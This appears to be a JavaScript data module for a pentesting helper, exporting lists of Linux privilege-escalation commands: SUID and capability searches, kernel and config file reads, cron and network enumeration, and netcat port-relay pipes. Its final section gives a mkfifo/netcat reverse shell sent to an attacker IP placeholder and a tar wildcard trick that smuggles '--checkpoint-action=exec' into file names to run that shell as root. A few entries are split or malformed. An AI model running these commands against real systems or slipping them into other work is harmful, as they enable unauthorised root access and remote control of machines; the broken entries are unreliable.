var o={
	Suid : [
		{ title: 'find / -user root -perm /4000 2>/dev/null' },
		{ title: 'find / -perm -u=s -type f 2>/dev/null' },
		{ title: "find / -type f -name '*.txt' 2>/dev/null" },
		{ title: 'find / -user root -perm -4000 -exec ls -ldb {}; > /tmp/suid' },
		{ title: 'getcap -r / 2>/dev/null'}		
	],VersionSystem : [
		{ title: 'cat /etc/issue' },
		{ title: 'cat /etc/*-release' },
		{ title: 'cat /etc/lsb-release' },
		{ title: 'cat /etc/redhat-release' }
	],KernelVersion : [
		{ title: 'cat /proc/version' },
		{ title: 'uname -a' },
		{ title: 'uname -mrs' },
		{ title: 'rpm -q kernel' },
		{ title: 'dmesg | grep Linux' },
		{ title: 'ls /boot | grep vmlinuz' }
	],EnvironmentVariables : [
		{ title: 'cat /etc/profile' },
		{ title: 'cat /etc/bashrc' },
		{ title: 'cat ~/.bash_profile' },
		{ title: 'cat ~/.bashrc' },
		{ title: 'cat ~/.bash_logout' },
		{ title: 'env' },
		{ title: 'set' }
	], ServiceSettings : [
		{ title: 'cat /etc/syslog.conf' },
		{ title: 'cat /etc/chttp.conf' },
		{ title: 'cat /etc/lighttpd.conf' },
		{ title: 'cat /etc/cups/cupsd.conf' },
		{ title: 'cat /etc/inetd.conf' },
		{ title: 'cat /etc/apache2/apache2.conf' },
		{ title: 'cat /etc/my.conf' },
		{ title: 'cat /etc/httpd/conf/httpd.conf' },
		{ title: 'cat /opt/lampp/etc/httpd.conf' },
		{ title: 'ls -aRl /etc/ | awk ‘$1 ~ /^.*r.*/' }
	],CronJobs : [
		{ title: 'crontab -l' },
		{ title: 'ls -alh /var/spool/cron' },
		{ title: 'ls -al /etc/ | grep cron' },
		{ title: 'ls -al /etc/cron*' },
		{ title: 'cat /etc/cron*' },
		{ title: 'cat /etc/at.allow' },
		{ title: 'cat /etc/at.deny' },
		{ title: 'cat /etc/cron.allow' },
		{ title: 'cat /etc/cron.deny' },
		{ title: 'cat /etc/crontab' },
		{ title: 'cat /etc/anacrontab' },
		{ title: 'cat /var/spool/cron/crontabs/root' }
	], UsersHost : [
		{ title: 'lsof -i' },
		{ title: 'lsof -i :80' },
		{ title: 'grep 80 /etc/services' },
		{ title: 'netstat -antup' },
		{ title: 'netstat -antpx' },
		{ title: 'netstat -tulpn' },
		{ title: 'chkconfig --list' },
		{ title: 'chkconfig --list | grep 3:on' },
		{ title: 'last' },
		{ title: 'lastlog' },
	],PortForwarding : [
		{
			title: '# FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]'
		},
		{ title: 'FPipe.exe -l 80 -r 80 -s 80 192.168.1.7' },
		{
			title: '# ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]'
		},
		{ title: 'ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port' },
		{ title: 'ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port' },
		{
			title: '# mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe'
		},
		{
			title: 'mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe # Port Relay'
		},
		{
			title:
				'mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe # Proxy (Port 80 to 8080)'
		},
		{ title: 'backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc' },
		{
			title: 'localhost 80 | tee -a outflow & 1>backpipe # Proxy monitor (Port 80 to 8080)'
		}
	], wildcardPrivesc : [
		{
			title: ` echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip>
        1234 >/tmp/f" > shell.sh`
		},
		{
			title: `touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"`
		},
		{
			title: ` touch "/var/www/html/--checkpoint=1"`
		}
	]
};
module.exports=o;
// console.log(o)